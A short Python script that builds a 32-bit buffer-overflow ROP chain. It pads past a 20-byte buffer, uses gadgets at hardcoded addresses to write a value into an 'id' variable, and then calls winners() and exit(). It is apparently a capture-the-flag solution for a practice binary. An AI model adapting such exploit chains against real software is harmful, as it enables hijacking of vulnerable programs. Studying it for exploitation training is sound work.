#!/usr/bin/env python3
import sys

payload  = b"\x90" * 24           # padding (20 byte buffer + 4 byte saved EBP)
payload += b"\xce\x67\x05\x08"    # pop edx; pop ebx; pop esi; ret
payload += b"\x1c\x3f\x0e\x08"    # addr of id -> edx
payload += b"\x41\x41\x41\x41"    # junk -> ebx
payload += b"\x41\x41\x41\x41"    # junk -> esi
payload += b"\x16\xc3\x04\x08"    # pop esi; ret
payload += b"\xf7\x80\x04\x08"    # addr containing 0x64 -> esi
payload += b"\xef\x95\x07\x08"    # xchg eax, esi; ret
payload += b"\x80\xd7\x07\x08"    # mov eax, [eax]; ret
payload += b"\xab\xff\x05\x08"    # mov [edx], eax; ret
payload += b"\x75\x98\x04\x08"    # winners()
payload += b"\x60\xc6\x04\x08"    # exit()
payload += b"\x48\x30\x0e\x08"    # "admin123456"

sys.stdout.buffer.write(payload)
